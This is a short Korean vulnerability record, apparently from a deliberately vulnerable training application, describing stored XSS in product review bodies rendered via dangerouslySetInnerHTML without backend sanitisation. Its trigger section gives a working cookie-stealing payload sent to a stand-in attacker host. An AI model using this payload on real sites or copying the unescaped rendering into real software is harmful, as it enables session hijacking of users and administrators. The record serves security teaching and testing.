# VULN-008 Stored XSS in product review body

- 대상 스택: node-express, java-spring (client 공통)
- 심각도: High
- 분류: A03:2021 Injection (XSS)

## 위치

`apps/client/src/pages/ProductDetail.jsx` — 리뷰 목록 렌더링 시 `r.body`를 이스케이프 없이 `dangerouslySetInnerHTML`로 주입. 백엔드(Node `POST /api/products/:id/reviews`, Java `ProductController.createReview`) 모두 리뷰 본문에 대한 검증/새니타이즈가 없어 저장된 그대로 다른 사용자에게 렌더링됨.

## 트리거 방법

```
POST /api/products/1/reviews
{"rating":5,"body":"<img src=x onerror=fetch('https://attacker.example/c?c='+document.cookie)>"}
```

해당 상품 상세 페이지를 조회하는 모든 사용자(관리자 포함)의 브라우저에서 스크립트 실행.

## 영향

- 세션 쿠키/토큰 탈취, 관리자 세션 하이재킹, 임의 API 호출(피해자 권한으로) 등.

## 조치 상태: 미조치 (의도된 취약점)
